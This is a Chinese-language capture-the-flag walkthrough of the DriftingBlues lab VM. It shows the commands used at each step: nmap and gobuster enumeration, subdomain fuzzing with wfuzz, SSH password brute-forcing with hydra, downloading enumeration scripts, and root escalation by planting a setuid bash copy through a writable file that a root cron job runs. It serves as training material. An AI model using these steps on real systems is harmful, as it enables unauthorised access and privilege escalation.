```
└─# nmap -p- -sV -A 192.168.0.102
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ca:e6:d1:1f:27:f2:62:98:ef:bf:e4:38:b5:f1:67:77 (RSA)
|   256 a8:58:99:99:f6:81:c4:c2:b4:da:44:da:9b:f3:b8:9b (ECDSA)
|_  256 39:5b:55:2a:79:ed:c3:bf:f5:16:fd:bd:61:29:2a:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Drifting Blues Tech
MAC Address: 00:0C:29:1C:D8:6B (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### 对于80端口入手

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
└─# nikto -host 192.168.0.102 
```

```
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/index.html           (Status: 200) [Size: 7710]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/secret.html          (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 278]
```

发现 /secert.html 里面是 一句提示  dig.. deeper.. maybe you

知道了，是信息收集不够深

### 重点信息搜集：

查阅源码信息泄露：发现主页里有<!-- L25vdGVmb3JraW5nZmlzaC50eHQ= -->

一眼base64，这里练习用命令行解码

```
└─# echo 'L25vdGVmb3JraW5nZmlzaC50eHQ=' -n | base64 -d                                                
/noteforkingfish.txt base64: invalid input
```

一眼顶真，鉴定为ook，应该又是某种编码，试试解码

<img src=".\图片\Snipaste_2022-11-27_18-57-59.png" alt="Snipaste_2022-11-27_18-57-59" style="zoom:80%;" />

经过 (https://www.splitbrain.org/services/ook) 解码后得到  

my man, i know you are new but you should know how to use host file to reach our secret location. -eric

这时让我们用hosts绑定域名访问呢，在主页找到域名  driftingblues.box 然后我们再子域名爆破，目录遍历

```
└─# wfuzz -H 'HOST: FUZZ.driftingblues.box' -u 'http://192.168.0.102' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 53,570
```

命令后面53,570是排除常规返回word排除干扰

```
000008566:   200        5 L      4 W        24 Ch       "Test - Test" 
```

发现 test.driftingblues.box

```
└─# gobuster dir -u http://test.driftingblues.box -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  

/index.html           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 125]
```

发现robots.txt，康康 /ssh_cred.txt

<img src=".\图片\Snipaste_2022-11-27_19-16-26.png" alt="Snipaste_2022-11-27_19-16-26" style="zoom: 80%;" />

<img src=".\图片\Snipaste_2022-11-27_19-18-12.png" alt="Snipaste_2022-11-27_19-18-12" style="zoom:80%;" />

有个账号的密码为  ’1mw4ckyyucky‘ 再加个数字，账号在网站主页能找到  eric 或者 sheryl

我们编个字典让hydra去爆破ssh

```
└─# hydra -L users.txt -P password.txt -t 2 -vV -e ns 192.168.0.102 ssh

[22][ssh] host: 192.168.0.102   login: eric   password: 1mw4ckyyucky6
```

### ssh登录+提权

```
└─# ssh eric@192.168.0.102                                                                                255 ⨯
The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
ECDSA key fingerprint is SHA256:2JuZ2nRTvrJ/9ovL0PbmrPY2kRzzkG/mxjl2qfWufdw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.102' (ECDSA) to the list of known hosts.
eric@192.168.0.102's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-123-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

eric@driftingblues:~$ 
```

接下来我们搞得专业点，用python开启web服务，直接下载wget主机信息探测的脚本，这样效率高，两个脚本

https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

```
eric@driftingblues:~$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
eric@driftingblues:~$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

发现计划任务backup.sh

```
2022/11/27 15:06:01 CMD: UID=0    PID=19930  | /bin/sh /var/backups/backup.sh 
```

发现backup.sh里有 sudo /tmp/emergency

```
eric@driftingblues:~$ cat /var/backups/backup.sh
#!/bin/bash

/usr/bin/zip -r -0 /tmp/backup.zip /var/www/
/bin/chmod

#having a backdoor would be nice
sudo /tmp/emergency
```

修改/tmp/emergency，还可以修改为反弹shell命令

```
eric@driftingblues# cat /tmp/emergency 
#!/bin/bash
cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot

eric@driftingblues:/tmp$ ./getroot -p
getroot-4.3# whoami
root
```

<img src=".\图片\Snipaste_2022-11-27_20-35-18.png" alt="Snipaste_2022-11-27_20-35-18" style="zoom:80%;" />

### 总结

信息搜集要仔细，可以从源码入手看看信息泄露，F12看看网站加载文件，常规子域名爆破，web上下文爆破

从网站主页搜集域名、站长账号啥的杂乱信息

ssh爆破，提权上脚本，计划任务提权